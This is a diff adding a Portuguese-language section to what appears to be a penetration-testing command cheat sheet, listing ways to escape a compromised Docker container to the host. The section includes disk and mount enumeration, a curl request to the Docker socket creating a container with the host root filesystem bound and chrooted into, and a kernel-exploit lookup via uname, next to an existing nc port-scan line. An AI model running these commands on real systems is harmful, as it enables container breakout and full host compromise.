@@ -7390,6 +7390,15 @@ Tags: `#comandos-avulsos` `#misc` `Coammandos aleatorios`
 
 	nc -zv 127.0.0.1 22 80 443 | echo "PODE SER UTILIZADO PARA SCAN DE PORTAS"
 
+### FORMAS DE ESCAPAR DO DOCKER | SAIR DO DOCKER PRO HOSPEDEIRO
+Formas de conseguir sair do docker ao comprometer uma maquina através da WEB
+
+	fdisk -l | ls -la /dev/ && echo "DESCOBRIR DISCOS DO HOSPEDEIRO QUE PODEM SER MONTADO"
+	ls -la /var/run/docker.sock
+	curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["chroot", "/host"], "Volumes": {"/": {}}, "Binds": ["/:/host"]}' http://localhost/cont/creat
+	mount | grep -v type | cat /proc/mounts && echo "PROCURA POR PONTOS DO HOST MONTADO NO CONTAINER"
+	uname -a && echo "POR SER O MESMO KERNEL DESCOBRIR FORMAS DE ESCALAR USANDO ALGUM EXPL PUBLIC"
+
 ### Ferramentas Avulsas | Ferramentas aleatorias
 Tags: `#ferramentas` `#misc`
 
